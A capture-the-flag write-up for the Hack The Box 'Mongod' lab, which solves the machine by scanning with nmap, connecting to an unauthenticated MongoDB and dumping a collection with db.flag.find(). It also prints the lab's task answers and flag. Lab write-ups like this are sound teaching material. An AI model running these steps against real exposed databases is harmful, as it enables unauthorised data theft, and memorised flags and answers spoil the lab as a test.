# Hack The Box - Mongod

Difficulty: Very Easy  
OS: Linux  
IP: TARGET.IP  

---

# 0. Task Answers

Task 1: How many TCP ports are open on the machine?  
2  

Task 2: Which service is running on port 27017 of the remote host?  
MongoDB 3.6.8  

Task 3: What type of database is MongoDB? (SQL or NoSQL)  
NoSQL  

Task 4: What command is used to launch the interactive MongoDB shell?  
mongosh  

Task 5: What command is used to list all databases?  
show dbs  

Task 6: What command is used to list collections in a database?  
show collections  

Task 7: What command is used to dump the content of all documents within the collection named flag?  
db.flag.find()  

Flag:  
1b6e6fb359e7c40241b6d431427ba6ea  

---

# 1. Reconnaissance

## Nmap scan

Command:

nmap -sC -sV -p- TARGET.IP

Result:

PORT     STATE SERVICE VERSION  
27017/tcp open  mongodb MongoDB 3.6.8  

Notes:

- MongoDB service exposed on port 27017  
- likely accessible without authentication  

---

# 2. Enumeration

## Service enumeration

Connect to MongoDB:

mongosh TARGET.IP:27017  

Findings:

- access to database shell  
- no authentication required  

Moje notatki:

nmap -sV -p- TARGET.IP -> MongoDB 3.6.8  

---

## Database enumeration

Command:

show dbs  

Findings:

- databases listed  

---

## Collections enumeration

Command:

use sensitive_information  
show collections  

Findings:

- collection: flag  

---

# 3. Exploitation

## Data extraction

Command:

db.flag.find()  

Result:

- documents containing the flag  

Moje notatki:

komenda -> use sensitive_information -> show collections -> db.flag.find()  

---

# 4. Privilege Escalation

Not required  

---

# 5. Flags

Flag:

1b6e6fb359e7c40241b6d431427ba6ea  

---

# 6. Lessons Learned

- MongoDB instances should never be exposed publicly without authentication  
- NoSQL databases can leak sensitive data if misconfigured  
- basic enumeration of databases and collections is essential  
- always check for default or misconfigured services  

---

# Tools Used

- nmap  
- mongosh  

---

# References

- https://www.mongodb.com/docs/manual/reference/method/  
